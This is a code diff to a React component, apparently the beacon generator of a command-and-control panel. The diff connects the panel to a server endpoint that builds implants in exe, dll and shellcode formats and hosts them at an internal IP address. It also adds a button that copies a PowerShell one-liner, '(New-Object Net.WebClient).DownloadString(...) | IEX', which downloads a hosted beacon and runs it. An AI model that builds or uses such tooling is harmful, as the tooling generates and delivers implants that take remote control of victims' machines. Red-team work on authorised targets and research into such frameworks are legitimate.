@@ -1,3 +1,4 @@
+import { useBeaconStore } from './BeaconStore'
 import React, { useState, useRef, useEffect } from 'react'
 
 const C = {
@@ -33,6 +34,8 @@ interface Profile {
 }
 
 interface Build {
+  id:          string   // server build ID (6 hex chars)
+  downloadUrl: string
   buildId:   string
   profileId: string
   format:    Format
@@ -101,9 +104,9 @@ const SEED_PROFILES: Profile[] = [
 ]
 
 const SEED_BUILDS: Build[] = [
-  { buildId: 'a1b2c3d4e5f6', profileId: 'sys-jquery', format: 'dll',       filename: 'beacon-a1b2c3d4.dll',       size: '124 KB', createdAt: '2026-11-20T07:14:00Z' },
-  { buildId: '0f1e2d3c4b5a', profileId: 'sys-jquery', format: 'shellcode', filename: 'beacon-0f1e2d3c.bin',       size: '88 KB',  createdAt: '2026-11-20T09:30:00Z' },
-  { buildId: 'deadbeef1234', profileId: 'sys-teams',  format: 'exe',       filename: 'beacon-deadbeef.exe',       size: '316 KB', createdAt: '2026-11-21T11:00:00Z' },
+  { id: 'a1b2c3', downloadUrl: 'http://10.10.10.5/beacon-a1b2c3.dll',       buildId: 'a1b2c3d4e5f6', profileId: 'sys-jquery', format: 'dll',       filename: 'beacon-a1b2c3.dll', size: '124 KB', createdAt: '2026-11-20T07:14:00Z' },
+  { id: '0f1e2d', downloadUrl: 'http://10.10.10.5/beacon-0f1e2d.bin',       buildId: '0f1e2d3c4b5a', profileId: 'sys-jquery', format: 'shellcode', filename: 'beacon-0f1e2d.bin', size: '88 KB',  createdAt: '2026-11-20T09:30:00Z' },
+  { id: 'deadbe', downloadUrl: 'http://10.10.10.5/beacon-deadbe.exe',       buildId: 'deadbeef1234', profileId: 'sys-teams',  format: 'exe',       filename: 'beacon-deadbe.exe', size: '316 KB', createdAt: '2026-11-21T11:00:00Z' },
 ]
 
 function uid() { return Math.random().toString(36).slice(2, 14) }
@@ -178,7 +181,13 @@ function BarBtn({ label, onClick, primary, yellow, disabled }: {
 }
 
 // ── Main ──────────────────────────────────────────────────────────
-export default function BeaconGen() {
+interface BeaconGenProps {
+  token?: string
+  sessionId?: string
+}
+
+export default function BeaconGen({ token = '', sessionId = '' }: BeaconGenProps) {
+  const { addBuild } = useBeaconStore()
   const [profiles,    setProfiles]    = useState<Profile[]>(SEED_PROFILES)
   const [builds,      setBuilds]      = useState<Build[]>(SEED_BUILDS)
   const [selected,    setSelected]    = useState<Profile | null>(SEED_PROFILES[0])
@@ -257,22 +266,39 @@ export default function BeaconGen() {
 
   async function generate() {
     if (!selected) return
+    if (!sessionId) { flash('No active session — open Operations tab first', true); return }
     setGenerating(true)
-    await new Promise(r => setTimeout(r, 1800))
-    const id  = uid()
-    const ext = format === 'shellcode' ? 'bin' : format
-    const b: Build = {
-      buildId:   id,
-      profileId: selected.id,
-      format,
-      filename:  `beacon-${id.slice(0,8)}.${ext}`,
-      size:      format === 'exe' ? '316 KB' : format === 'dll' ? '124 KB' : '88 KB',
-      createdAt: new Date().toISOString(),
+    try {
+      const res = await fetch('/api/beacon/generate', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`,
+        },
+        body: JSON.stringify({ sessionId, listener: 'http', format, arch: 'x64' }),
+      })
+      if (!res.ok) throw new Error(await res.text())
+      const data = await res.json() as { id: string; hostedPath: string; downloadUrl: string }
+      const ext = format === 'shellcode' ? 'bin' : format
+      const b: Build = {
+        id:          data.id,
+        downloadUrl: data.downloadUrl,
+        buildId:     data.id,
+        profileId:   selected.id,
+        format,
+        filename:    `beacon-${data.id}.${ext}`,
+        size:        format === 'exe' ? '316 KB' : format === 'dll' ? '124 KB' : '88 KB',
+        createdAt:   new Date().toISOString(),
+      }
+      setBuilds(prev => [b, ...prev])
+      addBuild({ id: data.id, profileName: selected.name, format, filename: b.filename, hostedUrl: data.downloadUrl, createdAt: b.createdAt })
+      setShowBuilds(true)
+      flash(`Build ${data.id} complete — cradle ready`)
+    } catch (err: any) {
+      flash(`Generate failed: ${err.message}`, true)
+    } finally {
+      setGenerating(false)
     }
-    setBuilds(prev => [b, ...prev])
-    setShowBuilds(true)
-    flash(`Build ${id.slice(0,8)} complete`)
-    setGenerating(false)
   }
 
   const sysProfs  = profiles.filter(p => p.isSystem)
@@ -592,7 +618,7 @@ export default function BeaconGen() {
           <table style={{ width: '100%', borderCollapse: 'collapse' }}>
             <thead>
               <tr>
-                {['Build ID','Profile','Format','Filename','Size','Date'].map((h, i) => (
+                {['Build ID','Profile','Format','Filename','Size','Date','Cradle'].map((h, i) => (
                   <th key={i} style={TH}>{h}</th>
                 ))}
               </tr>
@@ -608,6 +634,16 @@ export default function BeaconGen() {
                     <td style={{ ...TD, fontFamily: 'monospace', color: C.dim }}>{b.filename}</td>
                     <td style={{ ...TD, color: C.dim }}>{b.size}</td>
                     <td style={{ ...TD, color: C.dim }}>{new Date(b.createdAt).toLocaleDateString()}</td>
+                  <td style={TD}>
+                    {b.downloadUrl && (
+                      <button onClick={() => navigator.clipboard.writeText(
+                        `(New-Object Net.WebClient).DownloadString('${b.downloadUrl}') | IEX`
+                      )} style={{
+                        background: 'transparent', border: `1px solid ${C.border}`,
+                        color: C.dim, cursor: 'pointer', fontSize: 9, padding: '2px 6px', borderRadius: 2,
+                      }}>Copy</button>
+                    )}
+                  </td>
                   </tr>
                 )
               })}
